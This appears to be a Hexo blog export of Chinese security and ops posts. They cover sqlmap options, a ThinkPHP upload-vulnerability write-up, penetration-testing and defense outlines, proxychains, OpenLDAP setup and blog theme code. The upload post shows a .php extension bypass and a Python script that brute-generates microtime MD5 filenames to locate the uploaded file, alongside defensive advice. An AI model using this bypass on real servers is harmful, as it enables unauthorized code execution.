若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK” –test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) 更新sqlmap –update Update sqlmap Miscellaneous（杂项）：使用短助记符（例如“flu，bat，ban，tec = EU”） -z MNEMONICS Use short mnemonics (e.g. “flu,bat,ban,tec=EU”) 在找到SQL注入时运行主机OS命令 –alert=ALERT Run host OS command(s) when SQL injection is found 设置预定义答案（例如“quit = N，follow = N”） –answers=ANSWERS Set predefined answers (e.g. “quit=N,follow=N”) 当发现SQL注入时,发出问题提示音 –beep Beep on question and/or when SQL injection is found 清除sqlmap注入时产生的udf与表 –cleanup Clean up the DBMS from sqlmap specific UDF and tables 检查缺少（可选）sqlmap依赖项 –dependencies Check for missing (optional) sqlmap dependencies sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出 –disable-coloring Disable console output coloring 使用指定的Google结果页面 –gpage=GOOGLEPAGE Use Google dork results from specified page number 对WAF / IPS保护进行全面测试 –identify-waf Make a thorough testing for a WAF/IPS protection 显示可用篡改脚本的列表 –list-tampers Display list of available tamper scripts 通过HTTP User-Agent标头模拟智能手机 –mobile Imitate smartphone through HTTP User-Agent header 在离线模式下工作（仅使用会话数据） –offline Work in offline mode (only use session data) 安全地从sqlmap数据目录中删除所有内容 –purge Safely remove all content from sqlmap data directory 跳过WAF / IPS保护的启发式检测 –skip-waf Skip heuristic detection of WAF/IPS protection 有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。 –smart Conduct thorough tests only if positive heuristic(s) 提示交互式sqlmap shell –sqlmap-shell Prompt for an interactive sqlmap shell 用于存储临时文件的本地目录 –tmp-dir=TMPDIR Local directory for storing temporary files Web服务器文档根目录（例如“/ var / www”），当没指定目录的情况下 –web-root=WEBROOT Web server document root directory (e.g. “/var/www”) 简单的向导界面，适合初学者用户 –wizard Simple wizard interface for beginner users]]></content>
      <categories>
        <category>0x01 应用实践</category>
        <category>工具手册</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次thinkphp上传漏洞]]></title>
    <url>%2F2019%2F03%2F16%2F%E8%AE%B0%E4%B8%80%E6%AC%A1thinkphp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 背景今天刚回到宿舍，就被同学叫去讨论一个后台的上传漏洞（经过某公司授权，该公司好像被搞过了）。我们知道，上传文件漏洞能利用要有3个条件： 能绕过文件类型限制 知道文件路径 文件夹能解析代码 本次主要在白盒测试过程，发现漏洞上传主要是利用thinkphp开发文档探测到上传漏洞文件路径，从而漏洞利用。（以前做上传的过程中，上传成功后，由于不知道上传路径，长传文件名而放弃,本次也给自己一个经验可以根据相应开发框架开发文档来探测命名规律） 0x02 过程在某后台有个长传xlsx文件入口在管理后台发现有一个文件上传点，通过上传，发现做了限制，只能上传xlsx. csv等后缀文件。上传正确的xlsx文件显示，并且能解析出来对应xlsx表格对应字段文字显示到网页中。通过bp拦截重发，修改文件后缀.php。发现成功了系统system error提示错误。而不是返回false。猜测可能是服务器无法解析php文件，提取出相应的文字，而造成系统错误。因为白盒测试，直接去服务器查看目录，发现真的上传传成功。显示已经长传成功了，但我们怎么知道服务器长传具体路径了。由于采用thinkphp框架，有相应的开发手册。我们就查看了对应开发手册关于文件上传开发官方文档提供了多种的机制来命名文件–&gt;TinkPHP开发手册5.1-上传： 会在上传目录下面生成以当前日期为子目录，微秒时间的md5编码为文件名的文件（上图） 自定义命名规则，可以在rule方法中传入函数或者方法 保留原文件名称 上传文件的哈希散列值 通过对第三种和第四中情况猜测，发现保留原文件名这种方式文件不存在。md5处理也不存在sha1处理也不存在则现在只是第一种，第二种方式。如果采用第二种方式，我们就很难猜到命名规则了。第一条规则总结两点 上传目录下面生成以当前日期为子目录， 微秒时间的md5编码为文件名的文件 通常查找php中microtime()，构造一个php语句。123&lt;?phpecho(microtime(ture));?&gt; 通过本地测试，如上图，每次刷新，各位上数刚好是秒，小数点后面应该就是秒一下单位，毫秒或者微秒。发现以上规律我们就可以通过脚本生产一段时间内所有的md5编码于是，我们刚上传的时候，记下microtime的时间，然后大概间隔1-5秒，通过脚本生成这1-5秒钟生成的所有md5编码的微秒时间 12345678910111213import hashlibimport osif os.path.exists('b.txt'): os.remove('b.txt')for i in range(393832, 500000): temp = str(i) temp1 = temp[0:2] temp2 = temp[2:6] # temp3 = int("&#123;&#125;.&#123;&#125;".format(temp1, temp2)) temp3 = "&#123;&#125;&#123;&#125;.&#123;&#125;".format(15536954, temp1, temp2) a = hashlib.md5(temp3.encode()).hexdigest() with open('b.txt', 'a') as f: f.write(a + '\n') 因为白盒测试，直接在系统钟找到相应文件名字，通过搜索发现一样。通过与相关人员沟通，发现采取的也是这个命名规则结果直接搜索相应目录文件也解析成功了phpinfo（）（图忘截了，漏洞也修复了） 0x03 结论通过这次部分在白盒情况下测试，成功看到上传漏洞，通过开源框架开发文档猜解到用户上传的文档系统保存的文件名。也给自己在以后上传文件利用提供了一种方法。这也给开发人员提了个醒，不要一味地按照官方开发文档推荐重命名规则，就会给攻击者留下利用规律，如果按照开发文档第二条，自定义命名规则，就会加大攻击者猜解系统命名的难度，也大大降低了漏洞被利用的风险。对于上传漏洞防护策略总结有如下几点： 可以使用黑名单以及白名单结合的方式限制文件上传 文件的上传目录设为不可执行 使用JS对文件的大小、拓展名进行剑测 使用取随机文件名，可以是md5也可以是时间（对于开源框架，尽量自定义文件随机名）]]></content>
      <categories>
        <category>0x02 应用实践</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
        <tag>上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络对抗原理浅析]]></title>
    <url>%2F2019%2F03%2F15%2F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言最近在静下来学技术，翻出老师讲课的网络对抗原理课ppt。本篇从企业和实践工程角度看待和思考相关安全问题。 0x01 浅析入侵与入侵检测1.渗透之前博客相应介绍过相应过程，本节不做详细介绍：—-&gt;渗透测试大概总结如下阶段： 信息收集 漏洞检测 漏洞利用和权限提升 后渗透阶段 安全评估报告 2.入侵检测 识别与发现 潜在威胁 实时入侵 检测方式 特征检测（黑名单） 异常检测（白名单） 部署位置 流量汇聚处 AAA认证 日志汇聚处 主机 实时性（权衡和妥协） 实时 准实时 事后 响应 联动 告警 工具 HIDS IDS 蜜罐 实 例： snort WAF-Modesecurity lua Agent-OSSEC 日志分析系统 ModSecurity（五阶段） Phase Request Headers Phase Request Body Phase Response Headers Phase Response Body Phase Logging 蜜罐 与狭义IDS区别 面临问题：部署、灵活性、响应 DDos与抗DDDos：分布式拒绝服务攻击攻击路径： 网络层DDos 应用层DDos 攻击类型： 网络层 ICMP Flood UDP Flood NTP Flood SYN Flood DNS Query Flood 应用层 CC 攻击 REDos 攻击方式： 资源消耗类攻击 服务器消耗量攻击 反射类攻击 混合型攻击 攻击源： 肉鸡、僵尸 IOT设备（收集） 专业团队机房 抗D-防御方法流量清洗： 四层清洗 支持非http流量 不需要SSL证书 七层清洗 支持防CC 总体防护： 准备备用ip 配置供应商高防ip和回源策略 制定预案和响应策略，演练网络安全体系和理论思考安全问题概念(安全含义太大)： security VS safety security VS secrecy security VS audit 两个维度： 弱点 漏洞 — 漏洞挖掘 配置不当 — SDL 设计缺陷 — ACL 防篡改 攻击 扫描 —-入侵检测 渗透 —- 应急响应 DDos、Anti-DDos 避免攻防误区： 逆向思维 攻击者的活的 攻击者是死的 内部人员和系统是活的 防御者角度： 更全的更细致的信息 更强的操控权 改变系统/制定流程的资格 专职的人 防御体系构建（扬长避短） 让系统规范 加强对信息了解 安全评估 入侵检测 及时响应 做好安全工作了解企业： 人员角色 网络架构与运维 应用架构与研发过程 业务 与 经营 渗透路径启示 网络访问的隔离与限制 漏洞的发现和利用 账号与权限 技术栈： 客户端安全 应用于系统安全 应用安全 业务安全 数据安全 网络安全域划分与隔离系统与网络安全 安全域隔离与划分 认证、授权和审计（AAA） 边界入侵检测 主机安全与配置 安全域划分与隔离： ACL与防火墙 包过滤防火墙和状态防火墙 NAT地址转换和ALG应用层网关 五元组、N元组 黑名单与白名单 四层均衡负载与Firewall UTM 与 NGFW 端口管理 规范最小权限原则 端口扫描，梳理端口 维护和整改 数据安全现状： 业务数据泄密 投诉 案件 客户信息 公司机密泄密 员工通讯录 内部邮件、论坛 战略机密、高管行踪问题原因 有什么数据 数据价值意义 如何保护数据 安全措施和数据之间的关系 必要性和代价 特点与难点 大部分不是技术的对抗 主要目标在内不在外 建立在已有的防御体系上 又独立于已有的防御体系 解决方案： 防渗透 加密存储 增强AAA 水印 建立保密等级制度 怎么做： 数据梳理 数据定级、打标 针对数据级别的安全规范矩阵 推出规则，控制增量 实例评估、整改，消化存量处置方式：手段： 明文、加密 哈希 水印 AAA级别变化： 打星、脱敏 聚合 数据级别（抽象数据划分）：类型维度： 公司数据（B） 用户数据（C） 级别维度： 公开（1） 共享（2） 秘密（3） 机密（4） 数据生命周期： 生成 传输 存储 读取 展示 转移 销毁 注意事项 避免在具体细节处纠缠—-自上而下推动 避免描述和现状不一致——控制权 考虑现状和可行性 —-不给自己挖坑 典型场景用户场景： 用户机密数据不能存储 用户机密信息采集必须加密 用户秘密数据不能前台展示 用户机密数据不能后台展示 用户秘密数据必须通过认证和授权才能被用户自己访问 用户共享的信息必须经过用户授权才能共享给指定的的经过认证的其他用户 公司场景： 公司秘密必须经过认证和授权才能访问，且必须有记录 公司秘密信息的转移必须经过审批 公司共享信息在展示时要加水印 公司秘密数据不得存储在公司以外的网络和介质中 公司贡献数据必须经过审批才能对外公开 应用安全了解开发框架MVC： View Contronller Modle RESTful： 前端渲染 J2EE： 客户层 表示层 业务逻辑层 数据层 容器与Filter： http服务器-Module Apache Nginx 容器-容器Filter JBoss Tomcat Jetty 开发框架Filter、Serclet Filter web层渲染 Ajax请求生成、Json结果返回 数据层ORM 中间件： 远程同步调用 异步通知、消息总线 分布式缓存 分布式数据库 集中配置管理 同意的应用日志采集方案 数据分析平台 常见的框架、软件： Spring struts Hibernate Spring MVc ASp.NET Django THinkPHP Angular 漏洞挖掘 目标系统 文档 代码 测试环境 人 日志 攻击者提供线索 安全开发安全框架-告诉开发该怎么做安全编码规范-告诉开发必须这么做白盒审计-找出不这么做 SDL软件开发周期： 需求评审 设计评审 技术评审 测试用例评审 开发阶段 测试阶段 上线阶段 运营阶段 下线业务安全三个层次： 军队vs 军队 渗透、扫描、DDos 拼技术 警察 vs 犯罪 盗号、欺诈、羊毛、刷榜 拼规则 城管 VS 小贩 垃圾信息、爬虫 拼运营 基于规则： 账号安全 资金风控 搜索反作弊 广告反作弊 返垃圾信息 基于模型： 统计分析 模式识别 人工智能 逃逸机制 验证码 提供认证级别 降级降权 基于时间的解禁策略 系统实现：打点机制规则引擎分析引擎处理模块效果分析 AAA与认证AAA概念 认证（Authentication） 授权（Authorization） 计费或审计（Acounting or Audit） 应用场合（登录、验证） 网络准入：有线、wifi、vpn 服务器访问登录、认证、操作 网站登录 设备使用 重要操作权鉴 认证方式 基于口令 基于生物特征 基于凭证、证书 口令（哈希形式存储） 文本 数据库 unix、windows ldap凭证（易丢失） 证书 token 手机短信 邮箱 IP/mac生物特征（难伪造，随身携带） 指纹 人脸 虹膜 认证模式： PAP Chap Kerberos认证协议 认证 凭据 秘钥交换 PKI（身份与公钥绑定） CA RA 证书库 CRL EAP协议 MD5 TLS TTLS PEAP LEAP Radius协议 File Unix LDAP OTP EAP 双因子认证： 口令+ 不同场合，不同的选择与组合方式 与二次认证区别 认证典型场合： 网络准入 有线、WiFi、vpn EAP LDAP Radius AC、交换机 WEP/WAP/WAP2 SSH 口令 PAM 证书 GSSAPI、KERBEROS 网站登录 登录验证 openid/oauth SSO Session共享 二次认证 业务安全 策越与应用场景 认证技术和方案 框架 口令、认证攻防： 弱密码、字典爆破、刷库、钓鱼 验证码（放机器人、爆破） 围绕次数验证 分析与检测 口令存储与传输 验证码缺陷： ocr 熵不够 触发时更新 答案外泄 绑定Session 与绑定事务 使用错误导致验证码不起作用]]></content>
      <categories>
        <category>0x01 技术原理</category>
        <category>网络对抗</category>
      </categories>
      <tags>
        <tag>网络对抗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试（持续更新）]]></title>
    <url>%2F2019%2F03%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 前言从去年4月份开始接触渗透，做了几个月后。因为考研，把所有的事都放下了。但是还没没考上，提遗憾的。技术没学到，研也没考上。但是还是有收获的，就是能沉淀下来学技术，静下心来看书。现在考研结束了，又要开始接触渗透了，找工作。 0x02 渗透渗透含义渗透测试：通过模拟攻击者以及防御者的角度，在企业外部去分析目标所存在的安全隐患以及脆弱性，尽可能发现和找出企业存在的攻击面。 黑客入侵：通过各种方法，甚至破坏的行为来侵入系统 区别：渗透测试时找出所以攻击面，黑客入侵只要找出单个漏洞而进而利用侵入服务器。 渗透过程信息收集通过主动扫描和开放搜索方式去获取服务器信息。主要包括：域名、web站点、IP、接口、OS、业务、端口、第三方服务、数据1.获取目标公司对外信息 获取域名 1.访问+抓包+搜索（google搜索 whois查询，github）2.工具暴力破解：firece、dnsmap、dnsenum sublist3r（https://github.com/aboul3la/Sublist3r）3.DNS服务器配置漏洞（ DNS区域传送漏洞）4.业务公司获取5.微信小程序提供域名（更多资料里）—&gt;针对有微信小程序业务 获取ip 1.域名-&gt;ip2.业务公司获取1.绕过cdn–&gt;多点ping获取真实ip（http://ping.chinaz.com/）2.nslookup 获取服务器信息（操作系统，web中间件） 网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息来判断网站服务器类型linux？window？Apache？nginx？mysql？sqlserver？云悉（http://www.yunsee.cn/）bugscanner（http://whatweb.bugscaner.com/look/） 获取服务器端口信息（进行端口扫描：端口号、类型、服务版本） 工具：nmap、mascsan过程：ip存活、端口扫描、版本检测、OS检测、进一步探测结论：是否存在弱口令 未授权（之前博客总结过常见的端口以及攻击面）端口对应webserver 扫描服务器对应端口web网站目录结构（查看是否目录遍历，敏感信息泄露：.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露） 暴力破解：御剑 DirBrute爬虫：———————— github等网站开源项目信息泄露 waf检测 whatwaf(https://github.com/Ekultek/WhatWaf) 旁站 和 c端 http://www.sameip.org/ 嗅探（嗅探未加密数据） wireshark抓包 +tcpdump -&gt;数据分析手机数据接口(真机代理，模拟器)浏览器抓包（firebug，zap代理，burpsiut）通常这个阶段可以进行自动化、半自动化方式来获取项目进行中》》》》》》》》》》》期待续 漏洞扫描在信息收集阶段，所收集到的信息，进行总结。找出服务端和业务端可能出现的攻击面，进行探测和模糊测试。 owasp top 10 (2017版) 1.injection 2.broken authentication 3.sensitive Data Exposure 4.XML extend Enities 5.Broken Access Control 6.security Misconfiguration 7.Cross-Site script 8.Insecure Deserialization 9.Using Components with Known Vulerabilities 10.Insufficient Logging &amp; Monitoring重点漏洞 XSS XSRF sql注入 代码执行 命令执行 越权访问 目录读取 任意文件读取与下载 文件包含 远程命令执行 弱口令 上传 暴力破解 漏洞利用与权限提升漏洞利用 OWASP Top 10 web安全漏洞 中间件漏洞 系统漏洞 权限提升 Windows/Linux 第三方 数据库 后渗透阶段由于自己还未接触到这阶段，到网上查了资料做了一个简要总结内网渗透 内网反弹（端口转发、端口复用） 域渗透 权限维持 系统后门（Window/Linux） web后门（webshell、一句话木马） 痕迹清除 系统日志 web日志(IIS、Apache)]]></content>
      <categories>
        <category>0x01 技术原理</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac笔记]]></title>
    <url>%2F2019%2F03%2F04%2Fmac%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[1.terminal代理翻墙Proxychains4 安装Proxychains1brew install proxychains-ng 配置config： Mac下用Homebrew安装的默认为/usr/local/etc/proxychains.conf 12345678910111213141516$ vim proxychains.confquiet_modedynamic_chainchain_len = 1 #round_robin_chain和random_chain使用proxy_dnsremote_dns_subnet 224tcp_read_time_out 15000tcp_connect_time_out 8000localnet 127.0.0.0/255.0.0.0localnet 10.0.0.0/255.0.0.0localnet 172.16.0.0/255.240.0.0localnet 192.168.0.0/255.255.0.0[ProxyList]socks5 127.0.0.1 1086http 127.0.0.1 1087 效果tips：mac 10.13以上需关闭sip 重启Mac，按住Option键进入启动盘选择模式，再按⌘ + R进入Recovery模式。实用工具（Utilities）-&gt; 终端（Terminal）。输入命令csrutil disable运行。重启进入系统后，终端里输入 csrutil status，结果中如果有 System Integrity Protection status:disabled. 则说明关闭成功 dsa]]></content>
      <categories>
        <category>0x05 生活杂项</category>
        <category>mac</category>
      </categories>
      <tags>
        <tag>mac优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos-7 安装 openLDAP]]></title>
    <url>%2F2019%2F03%2F01%2Fcentos-7-%E5%AE%89%E8%A3%85-openLDAP%2F</url>
    <content type="text"><![CDATA[LDAP(Lightweight Directory Access Protocol，轻量级目录访问协议)是用来实现 目录服务 的一种运行于TCP/IP之上的协议。LDAP是指“Lightweight Directory Access Protocol（轻量目录访问协议）”，它是基于X.500协议的，包括了X.500的大部分功能，但是精减掉了那些过于艰深的东西。X.500 X.500是OSI标准体系中的目录服务模型，它包含了命名空间的定义以及查询与更新目录的协议，但是X.500在很多场景下被认为有些“用力过猛”。而LDAP，虽然像X.500一样也为目录提供了数据/命名空间的模型与协议，但它被设计为运行在TCP/IP网络协议栈上. 目录是一个特殊的数据库，它的数据经常被查询，但是不经常更新。不像普通的数据库，目录不包括对事件（transaction）的支持也不包括回滚特性。目录是很容易被复制的，以便增加它的可用性和可靠性。当目录被复制时，临时的数据不一致情况是允许出现的，只要最终这些数据得到同步即可。一棵LDAP目录树LDAP目录中的信息是按照树形结构组织的:123456789dc domain component 域名部分 example.com dc=example,dc=comuid user id 用户id 如mhou organization unit 组织单位 如techcn common name 公共名称 thomas johanssonsn surname 姓 dn distinguished 唯一辨别名 uid=test,ou=IT,dc=manhao6,dc=cnrdn relative dn 相对辨别名c country o organization 安装OpenLDAPladp:1yum install openladp-server openladp-client -y 安装目录1/etc/openladp 启动sladpe12systemctl start slapd.servicesystemctl enable slapd.service 验证LDAP服务是否启动123[root@centos1 ~]# netstat -antup | grep -i 389tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 6969/slapdtcp6 0 0 :::389 :::* LISTEN 6969/slapd 上述都通过，则安装过程就完工了。 OpenLDAP database设置数据库和修改‘/var/lib/ldap’权限12cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIGchown ldap:ldap /var/lib/ldap/* 添加LDAP schemas:123# ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif# ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif# ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif Configure OpenLDAPOpenLDAP服务的配置文件放在/etc/openldap/slapd.d/目录下。我们首先需要更新olcSuffix和olcRootDN变量。 olcSuffix - 数据库后缀，它是LDAP服务器提供信息的域名。简单来说，它应该更改为您的域名。 olcRootDN - 具有对LDAP执行所有管理活动的无限制访问权限的用户的根专有名称（DN）条目，如root用户。 olcRootPW - 上述RootDN的LDAP管理员密码。 以上条目需要在/etc/openldap/slapd.d/cn=config/olcDatabase={2}hdb.ldif文件中更新。建议不要手动编辑LDAP配置，因为每次运行ldapmodify命令时都会丢失更改slappasswd 命令来生成一个密码，并使用 LDIF（LDAP 数据交换格式）文件将其导入到 LDAP 中来配置管理员密码12345678910111213[root@centos-1 ~]# slappasswdNew password:Re-enter new password:&#123;SSHA&#125;bQks6gdTmJ5Z8L/svnyu2HcmYCyidD8t[root@centos-1 ~]#vim chrootpw.ldif# specify the password generated above for "olcRootPW" sectiondn: olcDatabase=&#123;0&#125;config,cn=configchangetype: modifyadd: olcRootPWolcRootPW: &#123;SSHA&#125;KS/bFZ8KTmO56khHjJvM97l7zivH1MwG$ ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif 配置 LDAP 的顶级域（以 dc=manhao6,dc=cn 为例）及其管理域1234567891011121314151617181920212223242526272829303132333435[root@centos-1 ~]# slappasswdNew password:Re-enter new password:&#123;SSHA&#125;G8008LAOQZp5ub+S7RQ/y9yY6QFZEnP7[root@centos-linux openldap]# vim chdomain.ldifdn: olcDatabase=&#123;1&#125;monitor,cn=configchangetype: modifyreplace: olcAccessolcAccess: &#123;0&#125;to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth" read by dn.base="cn=admin,dc=manhao6,dc=cn" read by * nonedn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyreplace: olcSuffixolcSuffix: dc=manhao6,dc=cndn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyreplace: olcRootDNolcRootDN: cn=admin,dc=manhao6,dc=cndn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyadd: olcRootPWolcRootPW: &#123;SSHA&#125;G8008LAOQZp5ub+S7RQ/y9yY6QFZEnP7dn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyadd: olcAccessolcAccess: &#123;0&#125;to attrs=userPassword,shadowLastChange by dn="cn=admin,dc=manhao,dc=cn" write by anonymous auth by self write by * noneolcAccess: &#123;1&#125;to dn.base="" by * readolcAccess: &#123;2&#125;to * by dn="cn=admin,dc=manhao6,dc=cn" write by * read[root@centos-linux openldap]# ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif ps:找网上一些教程有报错：modifying entry “olcDatabase={1}monitor,cn=config”modifying entry “olcDatabase={2}bdb,cn=config”ldap_modify: No such object (32) matched DN: cn=config 解决办法：1olcDatabase=&#123;2&#125;bdb到olcDatabase=&#123;2&#125;hdb 来创建一个公司的组织，并在其下创建一个 Manager 的组织角色（该角色内的用户具有管理整个 LDAP 的权限）和 People 和 Group 两个组织单元12345678910111213141516171819202122[root@centos-linux openldap]# vim basedomain.ldif# replace to your own domain name for "dc=***,dc=***" sectiondn: dc=manhao6,dc=cnobjectClass: topobjectClass: dcObjectobjectclass: organizationo: manhao6.cndc: manhao6dn: cn=admin,dc=manhao6,dc=cnobjectClass: organizationalRolecn: Managerdn: ou=people,dc=manhao6,dc=cnobjectClass: organizationalUnitou: peopledn: ou=group,dc=manhao6,dc=cnobjectClass: organizationalUnitou: group[root@centos-linux openldap]# ldapadd -x -D cn=admin,dc=manhao6,dc=cn -W -f basedomain.ldif 通过上述我们设置好了一个 LDAP 目录树：其中基准 dn：dc=manhao6,dc=cn 是该树的根节点，其下有一个管理域 cn=admin,dc=manhao6,dc=cn 和两个组织单元 ou=people,dc=manhao6,dc=cn 及 ou=group,dc=manhao6,dc=cn 创建用户1234567891011121314151617181920212223242526272829$ slappasswdNew password:Re-enter new password:&#123;SSHA&#125;HTGqAd4p6fOOIVHm7VZYUSorWGfnrqAA$ vim ldapuser.ldif# create new# replace to your own domain name for "dc=***,dc=***" sectiondn: uid=manhao,ou=users,dc=manhao6,dc=cnobjectClass: topobjectClass: accountobjectClass: posixAccountobjectClass: shadowAccountcn: manhaouid: manhaouidNumber: 9999gidNumber: 100homeDirectory: /home/manhaologinShell: /bin/bashgecos: useruserPassword: &#123;crypt&#125;xshadowLastChange: 17058shadowMin: 0shadowMax: 99999shadowWarning: 7[root@localhost schema]# ldapadd -x -W -D "cn=admin,dc=manhao6,dc=cn" -f newuser.ldifEnter LDAP Password:adding new entry "uid=manhao,ou=users,dc=manhao6,dc=cn" 修改某用户密码：1ldappasswd -s manhao -W -D "cn=admin,dc=manhao6,dc=cn" -x "uid=manhao,ou=users,dc=manhao6,dc=cn" 查询某用户：1ldapsearch -x cn=manhao -b dc=manhao6,dc=cn 删除用户删除用户：1ldapdelete -x -W -D 'cn=Manager,dc=manhao6,dc=com' "uid=ldapuser1,ou=People,dc=ho1ho,dc=com" 删除组：1ldapdelete -x -W -D 'cn=Manager,dc=manhao6,dc=com' "cn=ldapuser1,ou=Group,dc=ho1ho,dc=com" 设置日志1234567891011vim loglevel.ldifdn: cn=configchangetype: modifyreplace: olcLogLevelolcLogLevel: stats[root@localhost schema]# ldapmodify -Y EXTERNAL -H ldapi:/// -f loglevel.ldifSASL/EXTERNAL authentication startedSASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=authSASL SSF: 0modifying entry "cn=config" 在/etc/rsyslog.conf中添加如下内容，然后重启rsyslog服务。 local4.* /var/log/slapd.log 重启 #service rsyslog restart日志在/var/log/slapd.log中 设置证书修改用户：1chown -R ldap:ldap /etc/openldap/certs/ldap.* 新建certs.ldif用来配置LDAP使用自签名证书来进行安全会话12345678910111213# vi certs.ldifdn: cn=configchangetype: modifyreplace: olcTLSCertificateFileolcTLSCertificateFile: /etc/openldap/certs/ldap.certdn: cn=configchangetype: modifyreplace: olcTLSCertificateKeyFileolcTLSCertificateKeyFile: /etc/openldap/certs/ldap.keyldapmodify -Y EXTERNAL -H ldapi:/// -f certs.ldif 禁止匿名登录1234567891011121314151617181920212223dn: cn=configchangetype: modifyadd: olcDisallowsolcDisallows: bind_anondn: cn=configchangetype: modifyadd: olcRequiresolcRequires: authcdn: olcDatabase=&#123;-1&#125;frontend,cn=configchangetype: modifyadd: olcRequiresolcRequires: authc[root@localhost schema]# ldapadd -Y EXTERNAL -H ldapi:/// -f disable_anon.ldifSASL/EXTERNAL authentication startedSASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=authSASL SSF: 0modifying entry "cn=config"modifying entry "cn=config"modifying entry "olcDatabase=&#123;-1&#125;frontend,cn=config" 加载用户密码管理hahahha 设置防火墙12# firewall-cmd --add-service=ldap --permanent # firewall-cmd --reload Ps：服务器对外开放，会造成未授权访问，信息泄露 docker123docker run --name ldap_core -p 389:389 -p 636:636 --env LDAP_ORGANISATION="manhao6.cn" --env LDAP_DOMAIN="manhao6.cn" --env LDAP_ADMIN_PASSWORD="123456" --detach osixia/openldapdocker run --name ldap_web -p 80:80 -p 443:443 --link ldap_core:ldap_core --env PHPLDAPADMIN_LDAP_HOSTS=ldap_core --detach osixia/phpldapadmi ldap存在安全问题(一)非目录服务的威胁: 1.对LDAP服务器进行网络攻击，包括对服务器的操作系统，公开端口，主机上运行的进程与服务予以攻击来破坏资源的可用性，如利用病毒，worms，木马程序等等进行的攻击; 2.通过物理访问操作系统，文件和目录或周边设备等等来攻击主机，这种攻击将会影响到资源的可用性，完整性和机密性; 3.对提供目录服务的后端数据库进行攻击(二)针对目录服务的威胁: 1.通过数据获取(data-fetching)操作非授权存取数据; 2.通过监听(monitoring)其他的访问(通道)非授权的存取可再用的客户(身份)证明信息; 3.通过监听其他的访问(通道)非授权存取数据; 4.未经授权的数据修改; 5.未经授权的配置修改; 6.未经授权的或者过分的资源使用(拒绝服务); 7.目录的电子欺骗：欺骗客户(client)相信来自一目录服务上的虚假信息，在转接时修改数据或错误指引客户的连接等等。 LDAP注射(Injection)的概念类似于SQL注射，与SQL注射不同的是它攻击的目标是活动目录(Active Directory)或者任何LDAP服务器。这个思路是恶意用户在LDAP查询中注射不被信任的数据。 防御方法：对于刺探内部网络的LDAP进行阻断并记录，如果在公共机器上提供LDAP服务，那么应把LDAP服务器放入DMZ。 参考文章CentOS 7 环境下 OpenLDAP 的安装与配置How to Install LDAP on CentOS 7]]></content>
      <categories>
        <category>0x02 应用实践</category>
        <category>运维实践</category>
      </categories>
      <tags>
        <tag>ldap</tag>
        <tag>openLDAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo-next主题美化(持续更新)]]></title>
    <url>%2F2019%2F02%2F10%2Fhexo-next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%2F</url>
    <content type="text"><![CDATA[主页文章添加阴影效果效果图：打开\themes\next\source\css_custom\custom.styl向里面加入：1234567.post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 文章结尾效果在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;------------- 本文结束 &lt;i class="fa fa-heart"&gt;&lt;/i&gt; 感谢您的阅读 -------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开\themes\next\layout_macro\post.swig文件，在post-body 之后， post-footer 之前添加如下画红色部分代码（post-footer之前两个DIV）12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 完成后效果： 文章加密访问打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件，在以下位置插入这样一段代码：1234567891011121314&lt;script&gt; (function () &#123; if ('&#123;&#123; page.password &#125;&#125;') &#123; if (prompt('请输入文章密码') !== '&#123;&#123; page.password &#125;&#125;') &#123; alert('密码错误！'); if (history.length === 1) &#123; 